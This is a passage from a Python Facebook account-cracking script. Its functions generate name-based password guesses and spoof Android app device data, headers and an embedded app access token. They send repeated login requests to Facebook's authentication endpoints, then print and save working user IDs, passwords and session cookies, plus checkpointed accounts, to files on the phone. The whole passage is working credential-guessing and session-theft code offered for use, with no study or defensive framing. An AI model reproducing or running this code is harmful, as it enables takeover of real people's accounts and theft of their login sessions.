                sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "sim_country": "id",
                                "network_country": "id",
                                "enroll_misauth": "false",
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                "cpl": "true",
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': HOP_M2(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mMR🛠️SPJL💚🥀-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/MR×SPJL-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}MR🛠️SPJL💚🥀-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR×SPJL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.orca'
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': HOP_M3(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mMR🛠️SPJL💚🥀-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
                                        open('/sdcard/MR×SPJL-RNDM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}MR🛠️SPJL💚🥀-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR×SPJL-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Mozilla/5.0 (Linux; Android 13; 22126RN91Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': HOP_M3(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mSAMARPAN•GM-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} "+coki)
                                        open('/sdcard/SAMARPAN•GM-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}MR🛠️SPJL💚🥀-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR×SPJL-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| END |__________________#
try: 
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)
